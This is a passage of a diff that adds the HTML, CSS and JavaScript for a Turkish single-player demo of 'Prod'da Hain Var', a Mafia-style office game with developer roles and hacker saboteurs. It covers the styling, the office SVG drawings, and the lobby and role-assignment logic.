@@ -1,0 +1,897 @@
+<!doctype html>
+<html lang="tr">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>Prod'da Hain Var Demo</title>
+<meta name="claude:viewport-fit-sides" content="cover">
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Bricolage+Grotesque:opsz,wght@12..96,500;12..96,700;12..96,800&family=IBM+Plex+Sans:wght@400;500;600&family=JetBrains+Mono:wght@400;600&display=swap">
+<style>
+body{margin:0}
+/* Layout: solda ofis köyü sahnesi (gece/gündüz değişir), sağda rol kartı, hamle paneli ve sohbet. Telefonda panel sahnenin altına iner.
+   Oyunun kendi koyu dünyasına bağlı tek tema. */
+:root{
+  --bg:#0B0E1F; --surface:#151935; --surface-2:#1C2145; --ink:#E4E7F8; --muted:#979EC6; --line:#2B3264;
+  --accent:#A99CFF; --accent-ink:#0C0F22;
+  --town:#3FCDB8; --evil:#FF6E98; --neutral:#F2B850; --warn:#F2C94C;
+  --display:"Bricolage Grotesque","Segoe UI",system-ui,sans-serif;
+  --body:"IBM Plex Sans",system-ui,-apple-system,"Segoe UI",sans-serif;
+  --mono:"JetBrains Mono",ui-monospace,SFMono-Regular,Menlo,Consolas,monospace;
+  color-scheme:dark;
+}
+*{box-sizing:border-box}
+[hidden]{display:none!important}
+body{background:var(--bg);color:var(--ink);font-family:var(--body);font-size:15px;line-height:1.5}
+button{font:inherit;color:inherit}
+:focus-visible{outline:2px solid var(--accent);outline-offset:2px}
+.wrap{max-width:1360px;margin:0 auto;padding-block:16px 32px;padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));display:flex;flex-direction:column;gap:14px}
+
+.top{display:flex;flex-wrap:wrap;justify-content:space-between;align-items:center;gap:10px 20px;padding-bottom:12px;border-bottom:1px solid var(--line)}
+.logo{font-family:var(--display);font-weight:800;font-size:clamp(20px,3vw,26px);letter-spacing:-.02em}
+.logo span{color:var(--evil)}
+.logo small{font-family:var(--mono);font-weight:400;font-size:12px;color:var(--muted);letter-spacing:.08em;margin-left:6px}
+.phase{display:flex;align-items:center;gap:14px}
+.phase .pl{display:flex;flex-direction:column;align-items:flex-end;line-height:1.2}
+.phase b{font-family:var(--display);font-weight:700;font-size:17px}
+.phase span{font-size:13px;color:var(--muted)}
+.timer{font-family:var(--mono);font-weight:600;font-size:28px;font-variant-numeric:tabular-nums;min-width:3.2ch;text-align:right}
+
+.main{display:flex;flex-wrap:wrap;gap:16px;align-items:flex-start}
+.stagecol{flex:999 1 620px;min-width:0;display:flex;flex-direction:column;gap:8px}
+.side{flex:1 1 330px;min-width:0;display:flex;flex-direction:column;gap:12px}
+
+/* sahne */
+.stage{--o-floor:#262C5C;--o-wallL:#38407E;--o-wallR:#2C336C;--o-capL:#5A63B0;--o-capR:#4A529C;--o-scr:#0F1A3A;--o-ink:#E4E7F8;--o-sign:#0A0C1C;--o-rug:#171C44;--o-rugline:#2B3264;
+  position:relative;width:100%;max-width:100%;aspect-ratio:16/11;border-radius:16px;overflow:hidden;border:1px solid var(--line);color:var(--o-ink);isolation:isolate;user-select:none}
+.stage .bgN,.stage .bgD{position:absolute;inset:0;z-index:-1;transition:opacity 1.2s ease}
+.stage .bgN{background:radial-gradient(ellipse at 50% 50%,#1D2458 0%,#11153A 45%,#0A0C1E 80%)}
+.stage .bgD{background:radial-gradient(ellipse at 50% 50%,#F7F9FD 0%,#E3E8F2 55%,#D2D9E8 100%);opacity:0}
+.stage.day{--o-floor:#CDD5E6;--o-wallL:#AEB9D6;--o-wallR:#97A3C4;--o-capL:#D4DBEC;--o-capR:#C2CBE2;--o-ink:#121829;--o-rug:#D3DAEA;--o-rugline:#B7C1DA}
+.stage.day .bgD{opacity:1} .stage.day .bgN{opacity:0}
+.office{position:absolute;width:19%;transform:translate(-50%,-50%);display:flex;flex-direction:column;align-items:center;border-radius:12px;transition:filter .3s}
+.office.pick{cursor:pointer}
+.office.pick:hover .osvg,.office.sel .osvg{filter:drop-shadow(0 0 10px var(--pickc,#A99CFF))}
+.office.sel .sign{border-color:var(--pickc,#A99CFF)}
+.sign{position:relative;z-index:2;margin-bottom:-4%;display:flex;align-items:center;gap:5px;padding:2px 7px;border-radius:6px;background:var(--o-sign);color:#E4E7F8;border:1.5px solid #2B3264;font-family:var(--mono);font-weight:600;font-size:clamp(8px,1.15vw,12px);white-space:nowrap;box-shadow:0 5px 12px rgba(0,0,0,.45)}
+.sign i{font-style:normal;font-weight:400;font-size:.85em;color:#979EC6}
+.sign .dot{width:6px;height:6px;border-radius:50%;background:#566078;flex:none}
+.osvg{width:100%;height:auto;display:block;overflow:visible}
+.osvg .floor{fill:var(--o-floor);transition:fill 1.2s}
+.osvg .wallL{fill:var(--o-wallL);transition:fill 1.2s} .osvg .wallR{fill:var(--o-wallR);transition:fill 1.2s}
+.osvg .capL{fill:var(--o-capL);transition:fill 1.2s} .osvg .capR{fill:var(--o-capR);transition:fill 1.2s}
+.osvg .scr{fill:var(--o-scr);transition:fill .3s}
+.osvg .code{stroke:#3FCDB8;transition:stroke .3s} .osvg .code.b{stroke:#A99CFF}
+.osvg .person{transition:opacity .4s}
+.osvg .tape{opacity:0;transform:translateX(-40px);transition:opacity .5s,transform .6s cubic-bezier(.2,.9,.3,1.2)}
+.office.dead .tape{opacity:1;transform:none}
+.office.dead .person{opacity:0}
+.office.dead .scr{fill:#4A1222} .office.dead .code{stroke:#FF6E98}
+.office.red .scr{fill:#5A1426} .office.red .code{stroke:#FF6E98}
+.office.blocked .scr{fill:#2A2E44} .office.blocked .code{stroke:#4A4F6E}
+.office.away .person{opacity:0}
+.office.glitch .osvg{animation:glitch .09s steps(2) 10}
+@keyframes glitch{0%{transform:translate(0,0);filter:hue-rotate(0)}50%{transform:translate(-3px,1px);filter:hue-rotate(-40deg) saturate(2)}100%{transform:translate(3px,-1px)}}
+.tablewrap{position:absolute;left:50%;top:55%;width:34%;transform:translate(-50%,-50%)}
+.tablewrap svg{width:100%;height:auto;display:block;overflow:visible}
+.tablewrap .rug{fill:var(--o-rug);transition:fill 1.2s} .tablewrap .rugline{stroke:var(--o-rugline);transition:stroke 1.2s}
+.avatar{position:absolute;z-index:4;width:clamp(20px,3.2vw,34px);aspect-ratio:1;border-radius:50%;display:grid;place-items:center;font-family:var(--display);font-weight:800;font-size:clamp(9px,1.4vw,14px);color:#fff;border:2px solid #fff;box-shadow:0 4px 10px rgba(0,0,0,.35);transform:translate(-50%,-50%);transition:left 1.3s cubic-bezier(.5,0,.3,1),top 1.3s cubic-bezier(.5,0,.3,1),box-shadow .2s}
+.avatar.talk{box-shadow:0 0 0 3px #3FCDB8,0 0 18px 4px rgba(63,205,184,.7)}
+#fx{position:absolute;inset:0;pointer-events:none;z-index:5}
+.fxel{position:absolute;will-change:transform,opacity}
+.term{font-family:var(--mono);font-size:clamp(9px,1.1vw,12px);color:#FF6E98;text-shadow:0 0 8px rgba(255,110,152,.8);white-space:nowrap}
+.card{display:grid;place-items:center;text-align:center;padding:8px 12px;border-radius:10px;background:#F4F1FF;color:#121829;font-family:var(--display);font-weight:800;font-size:clamp(11px,1.5vw,16px);box-shadow:0 14px 30px rgba(0,0,0,.45);white-space:nowrap}
+.card small{display:block;font-family:var(--mono);font-weight:400;font-size:.66em;color:#566078}
+.caption{position:absolute;left:50%;bottom:2.5%;transform:translateX(-50%);z-index:6;max-width:92%;padding:7px 13px;border-radius:10px;background:#0A0C1C;color:#E4E7F8;border:1px solid #2B3264;font-size:clamp(11px,1.3vw,14px);box-shadow:0 10px 24px rgba(0,0,0,.45);opacity:0;transition:opacity .3s;text-align:center}
+.caption.show{opacity:1}
+.caption b{color:var(--cap,#A99CFF)}
+.mic{position:absolute;right:2%;bottom:2.5%;z-index:6;display:flex;align-items:center;gap:6px;padding:5px 10px;border-radius:999px;background:#0A0C1C;border:1px solid #2B3264;font-family:var(--mono);font-size:clamp(9px,1.1vw,12px);color:#979EC6}
+.mic s{width:8px;height:8px;border-radius:50%;background:#566078;text-decoration:none}
+.mic.on{color:#3FCDB8;border-color:#3FCDB8} .mic.on s{background:#3FCDB8;box-shadow:0 0 10px #3FCDB8}
+.hint{font-size:13px;color:var(--muted);margin:0}
+.hint kbd{font-family:var(--mono);font-size:12px;padding:1px 6px;border-radius:4px;border:1px solid var(--line);background:var(--surface)}
+canvas#confetti{position:absolute;inset:0;width:100%;height:100%;z-index:7;pointer-events:none}
+
+/* panel */
+.box{background:var(--surface);border:1px solid var(--line);border-radius:14px;padding:14px;display:flex;flex-direction:column;gap:10px;min-width:0}
+.avatar.pick{cursor:pointer;box-shadow:0 0 0 3px #FF6E98,0 4px 10px rgba(0,0,0,.35)}
+.avatar.pick:hover{transform:translate(-50%,-50%) scale(1.15)}
+.box h3{margin:0;font-family:var(--mono);font-size:11px;font-weight:600;letter-spacing:.09em;text-transform:uppercase;color:var(--muted)}
+.rolecard{border-width:2px}
+.rolecard.town{border-color:var(--town)} .rolecard.evil{border-color:var(--evil)}
+.rname{font-family:var(--display);font-weight:800;font-size:24px;line-height:1.1;letter-spacing:-.01em}
+.team{font-family:var(--mono);font-size:12px;padding:2px 8px;border-radius:6px;align-self:flex-start}
+.team.town{background:rgba(63,205,184,.15);color:var(--town)} .team.evil{background:rgba(255,110,152,.15);color:var(--evil)}
+.rdesc{margin:0;font-size:14px;color:#C9CDEB}
+.uses{font-family:var(--mono);font-size:12px;color:var(--muted)}
+.picks{display:grid;grid-template-columns:repeat(2,minmax(0,1fr));gap:6px}
+.pbtn{display:flex;align-items:center;gap:8px;padding:8px 10px;border-radius:9px;border:1px solid var(--line);background:var(--surface-2);cursor:pointer;min-height:42px;text-align:left;min-width:0}
+.pbtn:hover:not(:disabled){border-color:var(--accent)}
+.pbtn[aria-pressed="true"]{border-color:var(--accent);box-shadow:0 0 0 2px var(--accent) inset}
+.pbtn:disabled{opacity:.4;cursor:default}
+.pbtn .av{flex:none;width:24px;height:24px;border-radius:50%;display:grid;place-items:center;font-family:var(--display);font-weight:800;font-size:12px;color:#fff}
+.pbtn .nm{flex:1;min-width:0;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;font-weight:500}
+.pbtn .ct{font-family:var(--mono);font-weight:600;color:var(--evil)}
+.row2{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
+.btn{border:1px solid var(--line);background:var(--surface-2);border-radius:9px;padding:9px 14px;cursor:pointer;min-height:42px}
+.btn:hover:not(:disabled){border-color:var(--accent)}
+.btn.primary{background:var(--accent);color:var(--accent-ink);border-color:var(--accent);font-weight:600}
+.btn:disabled{opacity:.45;cursor:default}
+.btn[aria-pressed="true"]{border-color:var(--accent);box-shadow:0 0 0 2px var(--accent) inset}
+.note{font-size:13px;color:var(--muted);margin:0}
+.result{font-size:14px;padding:8px 10px;border-radius:8px;background:var(--surface-2);border-left:3px solid var(--accent)}
+.result.evil{border-left-color:var(--evil)} .result.town{border-left-color:var(--town)} .result.warn{border-left-color:var(--warn)}
+.chat{display:flex;flex-direction:column;gap:6px;height:260px;overflow-y:auto;padding-right:4px;font-size:14px}
+.msg{display:flex;gap:8px;align-items:flex-start;min-width:0}
+.msg .av{flex:none;width:22px;height:22px;border-radius:50%;display:grid;place-items:center;font-family:var(--display);font-weight:800;font-size:11px;color:#fff;margin-top:1px}
+.msg .tx{min-width:0;overflow-wrap:anywhere}
+.msg .tx b{font-weight:600;margin-right:4px}
+.msg .ch{font-family:var(--mono);font-size:11px;margin-right:4px;color:var(--muted)}
+.msg .ch.sabotaj{color:var(--evil)} .msg .ch.mezarlik{color:#8A8FB5}
+.msg.sys .tx{color:var(--warn);font-family:var(--mono);font-size:12.5px}
+.chatin{display:flex;gap:6px}
+.chatin input{flex:1;min-width:0;padding:9px 11px;border-radius:9px;border:1px solid var(--line);background:var(--surface-2);color:var(--ink);font:inherit}
+.chatin input:disabled{opacity:.5}
+
+/* lobi ve sonuç */
+.overlay{position:fixed;inset:0;z-index:20;display:grid;place-items:center;background:rgba(5,6,16,.82);padding:16px;padding-left:max(16px,env(safe-area-inset-left,0px));padding-right:max(16px,env(safe-area-inset-right,0px));overflow-y:auto}
+.dialog{width:min(640px,100%);background:var(--surface);border:1px solid var(--line);border-radius:18px;padding:22px;display:flex;flex-direction:column;gap:16px;box-shadow:0 30px 60px rgba(0,0,0,.5)}
+.lobbyd{width:min(820px,100%);padding:0 0 22px;overflow:hidden}
+.lobbyd>*:not(.hero){margin-inline:22px}
+.hero{display:block;width:100%;max-width:100%;height:auto;aspect-ratio:1408/768;object-fit:cover;border-bottom:1px solid var(--line)}
+.overlay#lobby{place-items:start center}
+.dialog h2 small{font-family:var(--mono);font-weight:400;font-size:.42em;letter-spacing:.08em;color:var(--muted);text-transform:uppercase;margin-left:6px}
+.dialog h2{margin:0;font-family:var(--display);font-weight:800;font-size:clamp(24px,4vw,32px);line-height:1.1;letter-spacing:-.02em;text-wrap:balance}
+.dialog h2 span{color:var(--evil)}
+.dialog p{margin:0;color:#C9CDEB}
+.field{display:flex;flex-direction:column;gap:6px}
+.field label{font-family:var(--mono);font-size:11px;letter-spacing:.09em;text-transform:uppercase;color:var(--muted)}
+.field input{padding:10px 12px;border-radius:9px;border:1px solid var(--line);background:var(--surface-2);color:var(--ink);font:inherit}
+.rolegrid{display:grid;grid-template-columns:repeat(auto-fill,minmax(140px,1fr));gap:6px}
+.rolegrid .btn{text-align:left;display:flex;flex-direction:column;gap:0;align-items:flex-start}
+.rolegrid .btn small{font-family:var(--mono);font-size:11px}
+.rolegrid .btn small.town{color:var(--town)} .rolegrid .btn small.evil{color:var(--evil)} .rolegrid .btn small.all{color:var(--muted)}
+.reveal{display:grid;grid-template-columns:repeat(auto-fill,minmax(150px,1fr));gap:6px}
+.reveal div{display:flex;flex-direction:column;padding:8px 10px;border-radius:9px;background:var(--surface-2);border:1px solid var(--line);font-size:14px}
+.reveal div small{font-family:var(--mono);font-size:11px}
+@media (prefers-reduced-motion: reduce){*{transition-duration:.01ms!important;animation-duration:.01ms!important}}
+</style>
+
+</head>
+<body>
+<div class="wrap">
+  <header class="top">
+    <div class="logo">Prod'da <span>Hain</span> Var<small>WHO BROKE PROD? · DEMO</small></div>
+    <div class="phase"><div class="pl"><b id="phName">Lobi</b><span id="phSub">Oyunu başlat</span></div><span class="timer" id="timer">--</span></div>
+  </header>
+  <div class="main">
+    <div class="stagecol">
+      <div class="stage" id="stage">
+        <div class="bgN"></div><div class="bgD"></div>
+        <div class="tablewrap" id="tablewrap"></div>
+        <div id="offices"></div>
+        <div id="fx"></div>
+        <div class="mic" id="mic"><s></s><span id="micTx">Ses kapalı</span></div>
+        <div class="caption" id="caption" role="status"></div>
+      </div>
+      <p class="hint">Toplantıda konuşmak için <kbd>Space</kbd> tuşunu basılı tut. Bu demoda ses gitmez, sadece göstergeyi görürsün. Gece hedefi, toplantıda oyunu ofislere ya da masadaki kişilere tıklayarak da seçebilirsin.</p>
+    </div>
+    <aside class="side">
+      <section class="box rolecard" id="roleBox"></section>
+      <section class="box" id="actBox"></section>
+      <section class="box">
+        <h3 id="chatTitle">Sohbet</h3>
+        <div class="chat" id="chat" aria-live="polite"></div>
+        <form class="chatin" id="chatForm"><input id="chatInput" autocomplete="off" placeholder="Toplantıda yazabilirsin" maxlength="140"><button class="btn" type="submit" id="chatSend">Gönder</button></form>
+      </section>
+    </aside>
+  </div>
+</div>
+
+<div class="overlay" id="lobby">
+  <div class="dialog lobbyd">
+    <img class="hero" alt="Prod'da Hain Var: Tech Team ofisinde endişeli yazılımcılar, köşede kapüşonlu bir hacker" src="hero.jpg">
+    <h2>Odaya hoş geldin <small>demo · 7 oyuncu</small></h2>
+    <p>Bu tek kişilik bir deneme. Diğer 6 oyuncu bot. Gerçek oyunda herkes kendi bilgisayarından odaya bağlanacak. Her oyunda 5 Ekip ve 2 Sabotaj rolü olur. Ekip rolleri 6 rol arasından seçilir.</p>
+    <div class="field"><label for="nameIn">Adın</label><input id="nameIn" value="Burak" maxlength="12"></div>
+    <div class="field"><label>Rolün</label><div class="rolegrid" id="roleGrid"></div></div>
+    <div class="row2"><button class="btn primary" id="startBtn" type="button">Oyunu başlat</button><span class="note">Kazanma: Ekip tüm sabotajcıları atınca, Sabotaj sayıca Ekip'e eşit olunca.</span></div>
+  </div>
+</div>
+<div class="overlay" id="endBox" hidden>
+  <div class="dialog">
+    <h2 id="endTitle"></h2>
+    <p id="endSub"></p>
+    <div class="reveal" id="endReveal"></div>
+    <div class="row2"><button class="btn primary" id="againBtn" type="button">Tekrar oyna</button></div>
+  </div>
+</div>
+
+<script>
+(() => {
+'use strict';
+const $ = s => document.querySelector(s);
+const wait = ms => new Promise(r => setTimeout(r, ms));
+const rnd = a => a[Math.floor(Math.random() * a.length)];
+const shuffle = a => { a = a.slice(); for (let i = a.length - 1; i > 0; i--) { const j = Math.floor(Math.random() * (i + 1)); [a[i], a[j]] = [a[j], a[i]]; } return a; };
+// Türkçe ek: ünlü uyumu ve kaynaştırma harfi
+function sfx(name, t){
+  const v = (name.toLocaleLowerCase('tr').match(/[aeıioöuü]/g) || ['e']).pop();
+  const endsV = /[aeıioöuü]$/i.test(name);
+  const four = { a:'ı', ı:'ı', o:'u', u:'u', e:'i', i:'i', ö:'ü', ü:'ü' }[v];
+  const two = 'aıou'.includes(v) ? 'a' : 'e';
+  if (t === 'in') return "'" + (endsV ? 'n' : '') + four + 'n';
+  if (t === 'i') return "'" + (endsV ? 'y' : '') + four;
+  return "'" + (endsV ? 'y' : '') + two;
+}
+const ek = (name, t) => name + sfx(name, t);
+const esc = s => String(s).replace(/[&<>"']/g, c => ({ '&':'&amp;', '<':'&lt;', '>':'&gt;', '"':'&quot;', "'":'&#39;' }[c]));
+
+const ROLES = {
+  senior: { name:'Senior Dev', team:'town', uses:2, verb:'İncele', color:'#A99CFF', desc:'Gece bir oyuncunun kodunu review edersin ve hangi takımda olduğunu öğrenirsin. Sosyal Mühendis seni kandırabilir.' },
+  qa:     { name:'QA Tester', team:'town', uses:2, verb:'Koru', color:'#3FCDB8', desc:'Gece bir oyuncuyu teste alırsın. O gece hacklenirse kurtulur. Kendini koruyamazsın.' },
+  devops: { name:'DevOps', team:'town', uses:1, verb:'İzle', color:'#F2C94C', desc:'Gece bir ofisin loglarını izlersin. Sabah o ofise kimlerin gittiğini görürsün.' },
+  scrum:  { name:'Scrum Master', team:'town', uses:1, verb:'Toplantıya çek', color:'#7FA2FF', desc:'Gece bir oyuncuyu acil toplantıya çekersin. O gece hamlesi boşa gider.' },
+  lead:   { name:'Tech Lead', team:'town', uses:1, verb:'Escalate et', color:'#FF8FB1', desc:'Bir kez, gece bir oyuncuyu escalate edersin. Ertesi gün oylamaya 2 oyla başlar. Kimin yaptığı gizli kalır.' },
+  analyst:{ name:'İş Analisti', team:'town', uses:1, verb:'Oy raporunu aç', color:'#5AAAFF', desc:'Bir kez, son oylamada kimin kime oy verdiğini görürsün. Gizli oylamanın tek istisnası sensin. Raporu oylama sonucunda ya da gece açabilirsin.' },
+  hacker: { name:'Hacker', team:'evil', uses:Infinity, verb:'Hackle', color:'#FF6E98', desc:'Her gece bir oyuncuyu hackleyip prod\'dan düşürebilirsin. Hakkın sınırsız.' },
+  social: { name:'Sosyal Mühendis', team:'evil', uses:2, verb:'Tuzak kur', color:'#FF6E98', desc:'Gece bir oyuncunun git geçmişini sahtelersin. O gece Senior Dev ona bakarsa sabotajcı görür. Hacker düşerse hackleme sana geçer.' },
+};
+const ROLE_ORDER = ['senior','qa','devops','scrum','lead','analyst','hacker','social'];
+const TOWN_ROLES = ROLE_ORDER.filter(r => ROLES[r].team === 'town');
+const TEAM = { town:'Ekip', evil:'Sabotaj' };
+const PEOPLE = [
+  { name:'Ayşe',   shirt:'#C2410C', hair:'#6B3A1E', neon:'#FF8FB1' },
+  { name:'Kaan',   shirt:'#4D7C0F', hair:'#111111', neon:'#A99CFF' },
+  { name:'Deniz',  shirt:'#9333EA', hair:'#C98B3A', neon:'#7FE0CF' },
+  { name:'Can',    shirt:'#B91C1C', hair:'#2A1A10', neon:'#F2C94C' },
+  { name:'Zeynep', shirt:'#A21CAF', hair:'#3A2416', neon:'#7FA2FF' },
+  { name:'Mert',   shirt:'#0E7490', hair:'#1A1A1A', neon:'#FF8FB1' },
+];
+const ME_LOOK = { shirt:'#2440C9', hair:'#2B1A10', neon:'#3FCDB8' };
+// sahne üzerinde ofis merkezleri (yüzde)
+const SPOTS = [[18,17],[50,15],[82,17],[10,52],[90,52],[29,84],[71,84]];
+const ME_SPOT = 5;
+
+/* ---------- ofis çizimi ---------- */
+function officeSVG(o){
+  return `<svg class="osvg" viewBox="0 0 300 240" role="img" aria-label="${esc(o.name)} ofisi">
+  <polygon class="floor" points="150,110 270,170 150,230 30,170"/>
+  <polyline points="90,140 210,200" stroke="#000" stroke-opacity=".12" fill="none"/><polyline points="210,140 90,200" stroke="#000" stroke-opacity=".12" fill="none"/>
+  <polygon class="wallL" points="30,170 150,110 150,20 30,80"/><polygon class="wallR" points="150,110 270,170 270,80 150,20"/>
+  <polygon class="capL" points="30,80 150,20 150,13 30,73"/><polygon class="capR" points="150,20 270,80 270,73 150,13"/>
+  <polygon class="capL" points="30,170 30,80 30,73 24,76 24,167"/><polygon class="capR" points="270,170 270,80 270,73 276,76 276,167"/>
+  <polygon points="120,80 84,98 84,63 120,45" fill="#E8ECF7" stroke="#0A0C1C" stroke-width="1.5"/>
+  <polygon points="114,58 105.6,62.2 105.6,56.2 114,52" fill="#F2C94C"/><polygon points="99.6,75.2 91.2,79.4 91.2,73.4 99.6,69.2" fill="#FF8FB1"/><polygon points="114,72 105.6,76.2 105.6,70.2 114,66" fill="#7FE0CF"/>
+  <circle cx="58" cy="78" r="8" fill="#E8ECF7" stroke="#0A0C1C" stroke-width="1.5"/><polyline points="58,78 58,73 61,79" stroke="#0A0C1C" stroke-width="1.3" fill="none"/>
+  <polygon points="186,48 222,66 222,54 186,36" fill="${o.neon}" opacity=".9"/>
+  <polygon points="174,94 246,130 216,145 144,109" fill="#8A6440"/><polygon points="144,109 216,145 216,179 144,143" fill="#5E4229"/><polygon points="246,130 216,145 216,179 246,164" fill="#6E4E31"/>
+  <polyline points="195.6,101 194.4,108" stroke="#0A0C1C" stroke-width="3"/><polyline points="225.6,116 224.4,123" stroke="#0A0C1C" stroke-width="3"/>
+  <polygon points="183.6,95.2 207.6,107.2 207.6,77.2 183.6,65.2" fill="#0A0C1C"/><polygon class="scr" points="185.6,94.2 205.6,104.2 205.6,80.2 185.6,70.2"/>
+  <polygon points="213.6,110.2 237.6,122.2 237.6,92.2 213.6,80.2" fill="#0A0C1C"/><polygon class="scr" points="215.6,109.2 235.6,119.2 235.6,95.2 215.6,85.2"/>
+  <g stroke-width="2" stroke-linecap="round"><polyline class="code" points="188,78 198,83"/><polyline class="code b" points="188,83 202,90"/><polyline class="code" points="188,88 196,92"/><polyline class="code b" points="218,93 230,99"/><polyline class="code" points="218,98 226,102"/><polyline class="code b" points="218,103 232,110"/></g>
+  <polygon points="58,146 74,146 72,162 60,162" fill="#B5643C"/><ellipse cx="60" cy="134" rx="5" ry="12" fill="#2F9E6E" transform="rotate(-25 60 134)"/><ellipse cx="72" cy="134" rx="5" ry="12" fill="#3FBF85" transform="rotate(25 72 134)"/><ellipse cx="66" cy="130" rx="5" ry="13" fill="#36AE79"/>
+  <ellipse cx="184" cy="182" rx="15" ry="5" fill="#0A0C1C" opacity=".6"/><polyline points="184,163 184,180" stroke="#0A0C1C" stroke-width="3"/>
+  <g class="person"><rect x="171" y="131" width="26" height="30" rx="11" fill="${o.shirt}"/><circle cx="184" cy="122" r="10.5" fill="#E9B98F"/><path d="M173.5 121 a10.5 10.5 0 0 1 21 0 q-10.5 4 -21 0z" fill="${o.hair}"/></g>
+  <rect x="172" y="146" width="24" height="18" rx="4" fill="#1A1E3E"/>
+  <g class="tape"><polygon points="40,150 262,120 262,132 40,162" fill="#F2C94C" stroke="#0A0C1C"/><text x="151" y="146" text-anchor="middle" transform="rotate(-7.7 151 146)" font-family="JetBrains Mono, monospace" font-size="10" font-weight="600" fill="#0A0C1C" letter-spacing="2">OFFLINE · OFFLINE · OFFLINE</text></g>
+</svg>`;
+}
+$('#tablewrap').innerHTML = `<svg viewBox="0 0 460 240" aria-label="Toplantı masası" role="img">
+  <ellipse class="rug" cx="230" cy="125" rx="215" ry="105"/><ellipse class="rugline" cx="230" cy="125" rx="200" ry="95" fill="none" stroke-width="2" stroke-dasharray="6 6"/>
+  <ellipse cx="230" cy="131" rx="150" ry="58" fill="#000" opacity=".25"/><ellipse cx="230" cy="122" rx="150" ry="58" fill="#5E4229"/><ellipse cx="230" cy="113" rx="150" ry="58" fill="#8A6440"/>
+  <ellipse cx="230" cy="113" rx="136" ry="50" fill="none" stroke="#A47A50" stroke-width="2"/><ellipse cx="230" cy="113" rx="20" ry="9" fill="#1A1E3E"/><ellipse cx="230" cy="111" rx="14" ry="6" fill="#3FCDB8"/>
+</svg>`;
+
+const stage = $('#stage'), fx = $('#fx'), cap = $('#caption');
+function caption(html, color){ cap.style.setProperty('--cap', color || '#A99CFF'); cap.innerHTML = html; cap.classList.add('show'); }
+function hideCaption(){ cap.classList.remove('show'); }
+const anim = (node, frames, opts) => node.animate(frames, { fill:'forwards', easing:'cubic-bezier(.3,.7,.3,1)', ...opts }).finished.catch(() => {});
+function el(html, x, y, cls=''){ const d = document.createElement('div'); d.className = 'fxel ' + cls; d.innerHTML = html; d.style.left = x + 'px'; d.style.top = y + 'px'; fx.appendChild(d); return d; }
+function clearFx(){ fx.innerHTML = ''; }
+// ofis içindeki bir svg noktasının sahnedeki px karşılığı
+function pt(p, x, y){ const s = stage.getBoundingClientRect(), r = p.dom.querySelector('.osvg').getBoundingClientRect(); return { x: r.left - s.left + x/300*r.width, y: r.top - s.top + y/240*r.height, s: r.width/300 }; }
+
+/* ---------- oyun durumu ---------- */
+let G = null, myRolePick = 'random', epoch = 0;
+function later(ms, fn){ const e = epoch; setTimeout(() => { if (e === epoch) fn(); }, ms); }
+
+function setupLobby(){
+  const grid = $('#roleGrid');
+  const opts = [['random','Rastgele','Sürpriz','all'], ...ROLE_ORDER.map(k => [k, ROLES[k].name, TEAM[ROLES[k].team], ROLES[k].team])];
+  grid.innerHTML = opts.map(([k, n, t, c]) => `<button type="button" class="btn" data-role="${k}" aria-pressed="${k === myRolePick}">${n}<small class="${c}">${t}</small></button>`).join('');
+  grid.querySelectorAll('button').forEach(b => b.onclick = () => { myRolePick = b.dataset.role; grid.querySelectorAll('button').forEach(x => x.setAttribute('aria-pressed', x === b)); });
+}
+setupLobby();
+$('#startBtn').onclick = startGame;
+$('#againBtn').onclick = () => { $('#endBox').hidden = true; $('#lobby').hidden = false; };
+
+function startGame(){
+  epoch++;
+  const myName = ($('#nameIn').value.trim() || 'Burak').slice(0, 12);
+  // 6 Ekip rolünden 5'i oyuna girer, seçtiğin rol her zaman içeride
+  let town = shuffle(TOWN_ROLES);
+  if (TOWN_ROLES.includes(myRolePick)) town = [myRolePick, ...town.filter(r => r !== myRolePick)];
+  let roles = shuffle([...town.slice(0, 5), 'hacker', 'social']);
+  if (myRolePick !== 'random'){ roles = roles.filter(r => r !== myRolePick); roles.unshift(myRolePick); }
+  const bots = shuffle(PEOPLE);
+  const players = [];
+  players.push({ id:0, name:myName, me:true, ...ME_LOOK, role:roles[0] });
+  bots.forEach((b, i) => players.push({ id:i+1, ...b, me:false, role:roles[i+1] }));
+  const spots = SPOTS.slice(); const mySpot = spots.splice(ME_SPOT, 1)[0];
+  players.forEach((p, i) => { p.spot = p.me ? mySpot : spots.shift(); p.alive = true; p.uses = ROLES[p.role].uses; p.susp = {}; p.known = {}; });
+  players.forEach(p => players.forEach(q => { if (q !== p) p.susp[q.id] = Math.random(); }));
+  G = { players, day:0, phase:'lobby', me:players[0], lastBallot:null, myReport:null, analystReport:null, night:{}, myPick:null, votes:{}, escalated:{}, lastNight:null, timer:0, ready:false, seniorClaims:[] };
+  $('#lobby').hidden = true;
+  $('#chat').innerHTML = '';
+  buildOffices();
+  renderRole();
+  sys('Oyun başladı. 7 oyuncu, 2 sabotajcı. Roller gizli.');
+  if (ROLES[G.me.role].team === 'evil'){
+    const mate = partnerOf(G.me);
+    sys(`Sabotaj ekibindesin. Ortağın: ${mate.name} (${ROLES[mate.role].name}).`, 'sabotaj');
+  }
+  startNight();
+}
+const alive = () => G.players.filter(p => p.alive);
+const byId = id => G.players.find(p => p.id === id);
+const isEvil = p => ROLES[p.role].team === 'evil';
+const partnerOf = p => G.players.find(q => q !== p && isEvil(q));
+function killerRole(p){ if (p.role === 'hacker') return true; if (p.role === 'social') { const h = G.players.find(q => q.role === 'hacker'); return !h.alive; } return false; }
+function actionOf(p){ return killerRole(p) ? 'hack' : p.role; }
+
+function buildOffices(){
+  const wrap = $('#offices'); wrap.innerHTML = '';
+  stage.querySelectorAll('.avatar').forEach(a => a.remove());
+  G.players.forEach(p => {
+    const d = document.createElement('div'); d.className = 'office';
+    d.style.left = p.spot[0] + '%'; d.style.top = p.spot[1] + '%';
+    d.innerHTML = `<span class="sign"></span>${officeSVG(p)}`;
+    d.onclick = () => onOfficeClick(p);
+    wrap.appendChild(d); p.dom = d;
+  });
+  G.players.forEach(p => setSign(p));
+}
+function setSign(p, tag, color){
+  const s = p.dom.querySelector('.sign');
+  let t = tag;
+  if (!t){
+    if (!p.alive) { t = `<i style="color:#FF6E98">${ROLES[p.role].name}</i>`; color = '#FF6E98'; }
